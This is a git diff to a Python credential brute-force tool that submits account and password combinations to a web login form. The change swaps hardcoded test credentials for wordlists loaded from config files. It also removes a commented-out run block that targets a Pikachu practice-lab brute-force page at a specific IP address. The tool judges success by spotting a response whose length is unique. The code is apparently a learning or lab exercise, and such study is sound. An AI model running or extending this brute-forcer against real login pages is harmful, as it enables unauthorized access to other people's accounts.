@@ -3,6 +3,7 @@ import urllib.request
 import http.cookiejar
 import time
 import os
+from src.main.bruteforce.loadkey.loadkey import Loadkey
 
 
 class BruteForce:
@@ -17,7 +18,7 @@ class BruteForce:
 
     def scan(self):
         request = urllib.request.Request(self.url, None, self.headers)  # The assembled request
-        response = urllib.request.urlopen(request)
+        # response = urllib.request.urlopen(request)
         cookiejar = http.cookiejar.CookieJar()
 
         handler = urllib.request.HTTPCookieProcessor(cookiejar)
@@ -52,12 +53,15 @@ class BruteForce:
         return m, account, passw, others
 
     def brute(self, m, account, passw, others):
+
+        loadpass = Loadkey(self.config_ini['main_project']['project_path'] + self.config_ini['brute']['brute_pass'])
+        loadacc = Loadkey(self.config_ini['main_project']['project_path'] + self.config_ini['brute']['brute_acc'])
+
         results = []
         self.log = self.log + "use headers: " + str(self.headers) + '\n'
-        # print(self.headers)
         dict = {}
-        valpassws = ['123456', '1']
-        valacc = ['test1', 'admin']
+        valpassws = loadpass.load()
+        valacc = loadacc.load()
         for valp in valpassws:
             for vala in valacc:
                 result = []
@@ -104,13 +108,3 @@ class BruteForce:
             if lens.count(lens[i]) == 1:
                 return results[i][:-1]
 
-
-# if __name__ == '__main__':
-#     url = "http://8.130.8.193/pikachu/vul/burteforce/bf_token.php"
-#     bb = BruteForce(url)
-#     m, name, passw, others = bb.scan()
-#     tt, re = bb.brute(m, name, passw, others)
-#
-#     # tt = bb.check(re)
-#     print(tt)
-#     print(re)
